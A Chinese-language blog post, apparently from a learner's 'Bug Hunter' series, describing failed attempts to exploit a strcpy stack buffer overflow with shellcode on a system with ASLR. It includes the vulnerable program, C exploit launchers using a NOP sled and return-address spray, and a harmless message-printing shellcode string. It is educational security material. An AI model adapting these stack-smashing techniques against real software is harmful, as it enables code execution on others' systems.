[Bug Hunter]关于stack overflow Lesson III
==========================================

### 本篇意在澄清利用stackoverflow的bug来执行shellcode的可行性
&emsp;&emsp;在前面的博客里我提到过“会给出将stackoverflow的bug和shellcode结合起来的博文”，就我目前的知识水平来说，暂时我还做不到这一点。下面澄清一下做不到的原因：  
&emsp;&emsp;请参考[Address space layout randomization (ASLR)](https://en.wikipedia.org/wiki/Address_space_layout_randomization)，也就是程序运行时，Stack的起始地址对于最高分配给进程的Virtual Memory的值来说，有一个随机的offset，而且每次不同，也很难预测。下面是一个简易的测试程序：
```cpp
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%s is at %p\n", argv[1], getenv(argv[1]));

    return 0;
}
```
&emsp;&emsp;程序启动的时候，会将所有的环境变量存到Stack上，运行本例子多次，你会发现每次的结果都不一样，而且差距非常大。如图：    

&emsp;&emsp;<img src="https://github.com/linghuazaii/blog/blob/master/image/stackoverflow/getenv.png" />  

### 含有stackoverflow的例子程序
```cpp
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
    char buffer[100];
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);

    return 0;
}
```

### 尝试一
```cpp
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

const char shellcode[] = "\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x14\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x68\x65\x6c\x6c\x6f\x20\x68\x61\x63\x6b\x69\x6e\x67\x20\x77\x6f\x72\x6c\x64\x0a";

int main(int argc, char **argv) {
    unsigned int i, *ptr, ret, offset = 377;
    char *command, *buffer;
    command = (char *)malloc(200);
    memset(command, 0, 200);

    strcpy(command, "./overflow_shellcode \'");
    buffer = command + strlen(command);

    if (argc > 1)
        offset = atoi(argv[1]);

    ret = (unsigned int)&i - offset;

    for (i = 0; i < 160; i += 4)
        *((unsigned int *)(buffer + i)) = ret;
    memset(buffer, 0x90, 60);
    memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);
    strcat(command, "\'");

    system(command);
    free(command);

    return 0;
}
```
&emsp;&emsp;显然，本例子成功执行的前提是`fork`的进程和父进程共享一个Stack Base，经测试，显然并不是共享一个Stack Base，新进程有自己随机的Stack Base。

### 尝试二
&emsp;&emsp;将SHELLCODE写到环境变量里去，然后添加非常多的`0x90`即`nop`指令，然后猜测SHEllCODE在Stack上的地址，很显然，失败。

### 尝试三
```cpp
#include <stdio.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    char *env = getenv("SHELLCODE");
    uint64_t i, ret;
    ret = uint64_t(env);
    //printf("%c\n", env[0]);
    printf("%p\n", ret);
    char *buffer = (char *)malloc(160);
    for (i = 0; i < 160; i += 8)
        *((uint64_t *)(buffer + i)) = ret;

    execle("./overflow_shellcode", "overflow_shellcode", buffer, 0);
    printf("%p\n", ret);

    free(buffer);

    return 0;
}
```
&emsp;&emsp;不调用`fork`，直接调用`execl`系列函数，测试再次失败，原因很简单，`execl`系列函数会替换当前进程上下文，包括栈，天知道替换之后的栈是哪样的，应该会有一个新的栈偏移，不然本例会成功的。

### 小结
&emsp;&emsp;综上所诉，目前就博主的水平来说，搞不定这个随机栈偏移的问题，当然还是有方法的，只不过博主目前不会，毕竟菜鸡博主。 :-)    

&emsp;&emsp;**Good Luck, Have Fun!!!!!!!!**
